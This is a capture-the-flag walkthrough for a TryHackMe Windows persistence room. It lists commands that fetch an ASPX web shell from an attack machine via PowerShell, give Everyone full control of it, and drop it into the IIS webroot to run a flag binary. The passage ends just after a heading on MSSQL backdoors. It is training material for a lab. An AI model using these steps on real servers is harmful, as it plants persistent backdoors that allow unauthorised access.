# About This Module
Module link: https://tryhackme.com/room/windowslocalpersistence

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/06/2023

# Using Web Shells
1. Started this room's machine
2. `firefox <URL>`
```Bash
root@ip-10-10-32-42:~# firefox https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Firefox%20cmdaspx.net%20Github.png)

3. `sudo python -m http.server`
```Bash
root@ip-10-10-32-42:~# sudo python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```
4. `(New-Object System.Net.WebClient).Downloadfile('http://<ATTACK MACHINE IP>:8000/<ASPX.NET WEB SHELL FILE1>','<ASPX.NET WEB SHELL FILE2>.exe')`
```PowerShell
PS C:\Users\Administrator> (New-Object System.Net.WebClient).Downloadfile('http://10.10.32.42:8000/cmdasp.aspx','shell.aspx')
```
5. `dir`
```PowerShell
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---         6/8/2022   4:40 AM                Desktop
d-r---        5/29/2022  12:07 AM                Documents
d-r---        5/29/2022  12:07 AM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---        3/17/2021   3:13 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----         7/7/2023   9:00 PM          20216 shell.aspx
```
6. `icacls <ASPX,WEB SHELL FILE PATH> /grant Everyone:F`
```PowerShell
PS C:\Users\Administrator> icacls shell.aspx /grant Everyone:F
processed file: shell.aspx
Successfully processed 1 files; Failed processing 0 files
```
7. `move shell.aspx C:\inetpub\wwwroot\`
```PowerShell
PS C:\Users\Administrator>move shell.aspx C:\inetpub\wwwroot\
        1 file(s) moved.
```
8. `explorer.exe "http://<TARGET IP>/shell.aspx"`
```PowerShell
PS C:\Users\Administrator> explorer.exe http://10.10.219.169/shell.aspx
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/ASPX.NET%20Web%20Shell%20Open.png)

9. `C:\flags\flag16.exe`

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/ASPX.NET%20Web%20Shell%20Flag.png)

# Using MSSQL as a Backdoor
1. Started this room's machine
